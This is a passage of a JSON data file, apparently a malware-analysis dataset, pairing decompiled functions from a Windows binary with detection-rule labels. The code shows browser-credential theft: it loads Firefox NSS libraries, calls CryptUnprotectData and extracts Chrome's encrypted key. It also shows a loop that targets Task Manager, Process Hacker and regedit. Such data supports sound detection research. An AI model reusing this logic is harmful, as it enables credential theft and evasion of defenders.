var_1ch;\n        }\n        else {\n            fcn.00405feb();\n            fcn.00405feb();\n        }\n        var_8h = 0;\n    }\n    fcn.0040ad8c();\n    uVar4 = 1;\n    fcn.00405feb();\ncode_r0x0040a34f:\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    return uVar4;\n}\n",
        "token_count": 2341
    },
    "0040a8c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pcbBinary\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpString2\n\nvoid __cdecl fcn.0040a8c3(uint pszString, uint *arg_ch)\n\n{\n    int32_t extraout_ECX;\n    uint pbBinary;\n    uint uStack64;\n    uint *puStack60;\n    uint *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    uint pcbBinary;\n    \n    pcbBinary = 0x40a8d0;\n    fcn.004011c0();\n    var_10h = pszString;\n    pcbBinary = 0x1fa0;\n    var_14h = 0x40a8e6;\n    uStack44 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_14h = 0x1fa0;\n    var_1ch = &fcn.0040a8c3::pbBinary;\n    var_18h = NULL;\n    puStack36 = 0x40a8f8;\n    fcn.00401052();\n    var_1ch = &fcn.0040a8c3::pcbBinary;\n    var_14h = 0;\n    var_18h = NULL;\n    puStack36 = &fcn.0040a8c3::pbBinary;\n    uStack40 = 1;\n    uStack48 = pszString;\n    iStack52 = 0x40a914;\n    (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)();\n    var_18h = &fcn.0040a8c3::pbBinary;\n    var_1ch = NULL;\n    var_14h = pcbBinary;\n    puStack56 = &fcn.0040a8c3::var_10h;\n    iStack52 = 0;\n    puStack60 = &fcn.0040a8c3::var_1ch;\n    lpString2 = 0;\n    var_8h = 0;\n    var_10h = 0;\n    uStack64 = 0x40a93b;\n    (**(extraout_ECX + 0x70))();\n    *(var_8h + lpString2) = 0;\n    iStack52 = 0x40a952;\n    puStack56 = fcn.00405ffa();\n    iStack52 = lpString2;\n    *arg_ch = puStack56;\n    puStack60 = 0x40a961;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    return;\n}\n",
        "token_count": 645
    },
    "0040ac8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040ac8b(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00410f61();\n    if ((0x17c < iVar1 - 0x26cU) && (0xed8 < iVar1 - 0x1838U)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 81
    },
    "0040ade3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ade3(uint lpPathName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint pszPath;\n    \n    uVar3 = 0;\n    fcn.00401052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(lpPathName);\n    fcn.0040357c(0x4176a4);\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"nss3.dll\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"msvcr120.dll\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"msvcp120.dll\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"mozglue.dll\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"softokn3.dll\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"msvcp\");\n    fcn.0040373f(&lpPathName);\n    fcn.0040357c(L\"msvcr\");\n    iVar4 = 0x5a;\n    var_8h = 0x5a;\n    do {\n        fcn.0040373f(&var_18h);\n        uVar5 = 0x418718;\n        iVar2 = var_8h;\n        fcn.00403384(var_8h);\n        fcn.0040357c(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.00403549(&pszPath);\n            fcn.00405feb();\n            break;\n        }\n        var_8h = var_8h + 10;\n        fcn.00405feb();\n        pszPath = 0;\n    } while (var_8h != 0x96);\n    do {\n        fcn.0040373f(&var_14h);\n        uVar5 = 0x418718;\n        iVar2 = iVar4;\n        fcn.00403384(iVar4);\n        fcn.0040357c(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.00403549(&pszPath);\n            fcn.00405feb();\n            break;\n        }\n        iVar4 = iVar4 + 10;\n        fcn.00405feb();\n        pszPath = 0;\n    } while (iVar4 != 0x96);\n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_10h);\n    *(in_ECX + 0xa8) = uVar5;\n    uVar5 = (*pcVar1)(var_ch);\n    *(in_ECX + 0xac) = uVar5;\n    uVar5 = (*pcVar1)(var_20h);\n    *(in_ECX + 0xb0) = uVar5;\n    uVar5 = (*pcVar1)(var_24h);\n    *(in_ECX + 0xb4) = uVar5;\n    iVar4 = (*pcVar1)(var_1ch);\n    *(in_ECX + 0xb8) = iVar4;\n    if ((((*(in_ECX + 0xac) != 0) && (*(in_ECX + 0xb0) != 0)) && (*(in_ECX + 0xb4) != 0)) && (iVar4 != 0)) {\n        uVar3 = fcn.00411e88(*(in_ECX + 0xb4));\n        *(in_ECX + 0x68) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x80) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x7c) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x70) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x74) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x78) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x6c) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x84) = uVar3;\n        uVar3 = fcn.00411e88();\n        *(in_ECX + 0x88) = uVar3;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar3 = 1;\n    }\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    return uVar3;\n}\n",
        "token_count": 1349
    },
    "0040b87d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040b87d(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    var_8h = 0x104;\n    var_ch = 1;\n    fcn.00401052(&lpString1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\\");\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, param_1);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, &lpString1, 0, 1, &hKey);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"Path\", 0, &var_ch, param_2, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 266
    },
    "0040c1dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040c1dd(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint var_4h;\n    \n    iVar1 = fcn.0040c4ae();\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040c479();\n        if ((((iVar1 == 0) ||\n             (iVar1 = fcn.0040c261(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, \n                                   arg_1ch, arg_20h),  iVar1 == 0)) &&\n            (iVar1 = fcn.0040c261(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, arg_1ch\n                                  , arg_20h),  iVar1 == 0)) &&\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar2 == -0x7ff6fff5)) {\n            iVar1 = 0;\n        }\n        fcn.0040c5e8();\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 347
    },
    "0040c261": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040c261(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint dwFlags, int32_t *arg_1ch, uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint pDataIn;\n    uint var_14h;\n    uint pOptionalEntropy;\n    uint var_ch;\n    uint pDataOut;\n    uint hMem;\n    \n    pOptionalEntropy = 0;\n    var_ch = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)(&pDataIn, 0, &pOptionalEntropy, 0, 0, dwFlags, &pDataOut);\n    if (iVar1 != 0) {\n        *arg_20h = pDataOut;\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, pDataOut);\n        *arg_1ch = arg_8h;\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, hMem, *arg_20h);\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    }\n    return iVar1;\n}\n",
        "token_count": 281
    },
    "0040c479": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040c479(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = *0x41c160;\n    while( true ) {\n        if (puVar2 == 0x41c160) {\n            return NULL;\n        }\n        iVar1 = fcn.00401000(param_1, puVar2 + 2, 0x10);\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 128
    },
    "0040c5b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c5b2(uint32_t uBytes, uint32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    if ((uBytes | arg_ch) != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes);\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, *in_ECX, uBytes);\n        }\n    }\n    *in_ECX = arg_8h;\n    return;\n}\n",
        "token_count": 144
    },
    "0040c63e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c63e(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint hMem;\n    \n    uVar3 = 0;\n    iVar1 = fcn.0040c30d(&var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = fcn.0040c2cc();\n    if (iVar1 == 0) goto code_r0x0040c6ae;\n    iVar2 = fcn.004010d5(iVar1, L\"\\\"os_crypt\\\":{\\\"encrypted_key\\\":\\\"\");\n    if (iVar2 == 0) {\ncode_r0x0040c6a5:\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x418fe0;\n        iVar2 = fcn.004010d5(iVar2 + 0x3a);\n        if (iVar2 == 0) goto code_r0x0040c6a5;\n        uVar3 = fcn.0040c157(uVar3, arg_10h, arg_14h);\n    }\n    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\ncode_r0x0040c6ae:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    return uVar3;\n}\n",
        "token_count": 335
    },
    "0040db39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040db39(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    \n    iVar1 = fcn.00410bbe();\n    return iVar1 != 0;\n}\n",
        "token_count": 47
    },
    "0040e73f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e73f(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar auStack76 [36];\n    uint32_t uStack40;\n    uint uStack16;\n    \n    *0x426978 = *0x426978 & 0x7fff;\n    uVar3 = 0;\n    iVar1 = fcn.0040f01e(param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.0040efc1();\n        if ((iVar2 != 0) && (3 < uStack40)) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x438, 0, uStack16);\n            if (iVar2 != 0) {\n                iVar2 = fcn.0040ef73(&stack0xffffff90);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0040ea79(auStack76);\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.0040e81e(*(iVar1 + 4), &stack0xffffff94, *(iVar1 + 0xc), *(iVar1 + 0x14));\n                    }\n                    fcn.0040f044();\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 303
    },
    "0040e981": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e981(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = 0;\n    var_1ch = 0;\n    var_14h = arg_8h[2];\n    iVar1 = *arg_8h;\n    var_18h = 0x426970;\n    var_10h = 0;\n    var_ch = iVar1 + var_14h;\n    piVar5 = arg_8h;\n    if (*in_ECX[1] == 0) {\n        iVar2 = *arg_8h[1];\n        if (iVar2 == 0) {\n            var_4h = iVar1 + in_EDX;\n            var_8h = in_ECX;\n            do {\n                if (var_ch < var_4h) break;\n                iVar2 = fcn.00401000(*var_8h, iVar1, in_EDX);\n                uVar4 = iVar2 == 0;\n                iVar1 = iVar1 + 1;\n                var_4h = var_4h + 1;\n            } while (iVar2 != 0);\n            piVar5 = iVar1 + -1;\n        }\n        else if ((((iVar2 == 1) || (iVar2 == 3)) || (iVar2 == 6)) &&\n                (var_1ch = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, var_14h),  var_1ch != 0)) {\n            iVar1 = fcn.0040ee24(arg_8h[2]);\n            if ((iVar1 != 0) && (uVar4 = fcn.0040e981(&var_1ch),  uVar4 != 0)) {\n                piVar5 = (*arg_8h - var_1ch) + var_10h;\n            }\n            (*_sym.imp.KERNEL32.dll_LocalFree)(var_1ch);\n        }\n    }\n    piVar3 = NULL;\n    if (uVar4 != 0) {\n        piVar3 = piVar5;\n    }\n    arg_8h[3] = piVar3;\n    return uVar4;\n}\n",
        "token_count": 589
    },
    "0040ece1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ece1(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint nNumberOfBytesToWrite;\n    int32_t iVar3;\n    uint var_60h;\n    int32_t var_24h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_ch = &var_60h;\n    iVar3 = 0;\n    var_14h = 0;\n    var_8h = 0x426970;\n    var_10h = 0x426970;\n    var_18h = param_1[1];\n    var_4h = param_2;\n    iVar2 = fcn.0040ee24(0x40);\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalAlloc;\n    if ((iVar2 != 0) && (var_60h == 0x5a4d)) {\n        var_1ch = *param_1 + var_24h;\n        var_ch = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x18);\n        if (var_ch != NULL) {\n            fcn.0040ee24(0x18);\n            nNumberOfBytesToWrite = 0x108;\n            if (*(var_ch + 4) == 0x14c) {\n                nNumberOfBytesToWrite = 0xf8;\n            }\n            var_14h = (*pcVar1)(0x40, nNumberOfBytesToWrite);\n            pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n            if (var_14h != 0) {\n                iVar3 = fcn.0040ee24(nNumberOfBytesToWrite);\n                if (iVar3 == 0) {\n                    (*pcVar1)(var_14h);\n                }\n                else {\n                    *var_4h = var_14h;\n                }\n            }\n            (*pcVar1)(var_ch);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 502
    },
    "0040f01e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.0040f01e(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    \n    uVar4 = 0;\n    puVar2 = NULL;\n    puVar1 = 0x41c170;\n    do {\n        puVar3 = puVar1;\n        if (*0x426978 <= *puVar3 && *puVar3 != *0x426978) {\n            return puVar2;\n        }\n        uVar4 = uVar4 + 0x3c;\n        puVar2 = puVar3;\n        puVar1 = puVar3 + 0xf;\n    } while (uVar4 < 0xf0);\n    return puVar3;\n}\n",
        "token_count": 181
    },
    "0040f086": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f086(void)\n\n{\n    int32_t iVar1;\n    uint noname_0;\n    uint noname_0_00;\n    uint noname_0_01;\n    uint noname_0_02;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    do {\n        fcn.004036f7(0x419a34);\n        iVar1 = fcn.00412155();\n        fcn.00405feb();\n        if ((iVar1 != 0) && (iVar1 != iVar3)) {\n            fcn.00407b2e(noname_0, noname_0, iVar1);\n            iVar3 = iVar1;\n        }\n        fcn.004036f7(L\"TASKmgr.exe\");\n        iVar1 = fcn.00412155();\n        fcn.00405feb();\n        if ((iVar1 != 0) && (iVar1 != iVar2)) {\n            fcn.00407b2e(noname_0_00, noname_0_00, iVar1);\n            iVar2 = iVar1;\n        }\n        fcn.004036f7(L\"ProcessHacker.exe\");\n        iVar1 = fcn.00412155();\n        fcn.00405feb();\n        if ((iVar1 != 0) && (iVar1 != iStack32)) {\n            fcn.00407b2e(noname_0_01, noname_0_01, iVar1);\n        }\n        fcn.004036f7(L\"regedit.exe\");\n        iVar1 = fcn.00412155();\n        fcn.00405feb();\n        iStack32 = 0;\n        if ((iVar1 != 0) && (iVar1 != iStack28)) {\n            fcn.00407b2e(noname_0_02, noname_0_02, iVar1);\n            iStack28 = iVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 469
    },
    "0040f19e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.0040f19e(uint arg_8h, uint arg_ch)\n\n{\n    uint64_t uVar1;\n    int16_t iVar2;\n    int32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x55ada8 = CONCAT44(*0x55adac, *0x55ada8);\n    if (((*0x55ada8 == 0) && (*0x55ada8 = CONCAT44(*0x55adac, *0x55ada8),  *0x55adac == 0)) &&\n       (*0x55ada8 = fcn.0040f29d(),  *0x55ada8 == 0)) {\n        var_8h = 0;\n        var_4h = 0;\n    }\n    else {\n        _var_18h = 0;\n        iVar2 = fcn.00401133();\n        var_18h = CONCAT22(iVar2 + 1, iVar2);\n        uVar1 = _var_18h & 0xffffffff00000000;\n        _var_18h = uVar1 | var_18h;\n        _var_8h = 0;\n        fcn.0040f91f(*0x55ada8, *0x55adac, 4, arg_8h, arg_ch, &var_18h, &var_18h >> 0x1f, 0, 0, &var_8h, &var_8h >> 0x1f\n                     , unaff_EDI, unaff_ESI, var_18h, uVar1 >> 0x20, in_ECX, in_ECX >> 0x1f, 0, 0, unaff_EBP, \n                     unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, in_stack_00000010);\n    }\n    *0x55adac = *0x55ada8 >> 0x20;\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 609
    },
    "0040fae9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040fae9(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x55adc0 = CONCAT44(*0x55adc4, *0x55adc0);\n    if ((*0x55adc0 == 0) && (*0x55adc0 = CONCAT44(*0x55adc4, *0x55adc0),  *0x55adc4 == 0)) {\n        uVar1 = fcn.0040f541();\n        *0x55adc0 = fcn.0040f19e(uVar1, uVar1 >> 0x20);\n        if (*0x55adc0 == 0) goto code_r0x0040fb91;\n    }\n    *0x55adc4 = *0x55adc0 >> 0x20;\n    if (arg_14h == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *arg_14h;\n    }\n    var_ch = 0;\n    iVar2 = fcn.0040f91f(*0x55adc0, *0x55adc4, 5, in_ECX, in_ECX >> 0x1f, arg_8h, arg_ch, in_EDX, in_EDX >> 0x1f, \n                         arg_10h, 0, &var_10h, &var_10h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe8, \n                         var_10h, 0, in_stack_fffffff4, in_ECX, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        if (arg_14h != NULL) {\n            *arg_14h = var_10h;\n        }\n        *0x55adc4 = *0x55adc0 >> 0x20;\n        return 1;\n    }\n    fcn.0040f238(iVar2);\ncode_r0x0040fb91:\n    *0x55adc4 = *0x55adc0 >> 0x20;\n    return 0;\n}\n",
        "token_count": 649
    },
    "0040fbb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.0040fbb4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint in_stack_ffffffe0;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x55ad98 = CONCAT44(*0x55ad9c, *0x55ad98);\n    if ((*0x55ad98 == 0) && (*0x55ad98 = CONCAT44(*0x55ad9c, *0x55ad98),  *0x55ad9c == 0)) {\n        uVar1 = fcn.0040f541();\n        *0x55ad98 = fcn.0040f19e(uVar1, uVar1 >> 0x20);\n        if (*0x55ad98 != 0) goto code_r0x0040fc05;\n    }\n    else {\ncode_r0x0040fc05:\n        *0x55ad9c = *0x55ad98 >> 0x20;\n        var_10h = arg_8h;\n        var_ch = arg_ch;\n        var_14h = 0;\n        iVar2 = fcn.0040f91f(*0x55ad98, *0x55ad9c, 6, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, 0, 0, &var_18h\n                             , &var_18h >> 0x1f, 0x3000, 0, 0x40, 0, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe0\n                             , in_EDX, 0, arg_8h, arg_ch, in_stack_fffffff4, in_ECX);\n        if (iVar2 == 0) goto code_r0x0040fc5d;\n        fcn.0040f238(iVar2);\n    }\n    var_10h = 0;\n    var_ch = 0;\ncode_r0x0040fc5d:\n    *0x55ad9c = *0x55ad98 >> 0x20;\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 649
    },
    "0040fc62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040fc62(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_8h = 0;\n    var_18h = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    *0x55adc8 = CONCAT44(*0x55adcc, *0x55adc8);\n    if ((*0x55adc8 == 0) && (*0x55adc8 = CONCAT44(*0x55adcc, *0x55adc8),  *0x55adcc == 0)) {\n        uVar1 = fcn.0040f541();\n        *0x55adc8 = fcn.0040f19e(uVar1, uVar1 >> 0x20);\n        if (*0x55adc8 != 0) goto code_r0x0040fcbc;\n    }\n    else {\ncode_r0x0040fcbc:\n        *0x55adcc = *0x55adc8 >> 0x20;\n        iVar2 = fcn.0040f91f(*0x55adc8, *0x55adcc, 10, arg_8h, arg_ch, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, arg_10h, arg_14h, 0\n                             , 0, &var_8h, &var_8h >> 0x1f, &var_18h, &var_18h >> 0x1f, unaff_EDI, unaff_ESI);\n        if (iVar2 == 0) {\n            goto code_r0x0040fd09;\n        }\n        fcn.0040f238(iVar2);\n    }\n    var_8h = 0;\n    var_4h = 0;\ncode_r0x0040fd09:\n    *0x55adcc = *0x55adc8 >> 0x20;\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 544
    },
    "0040fd0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
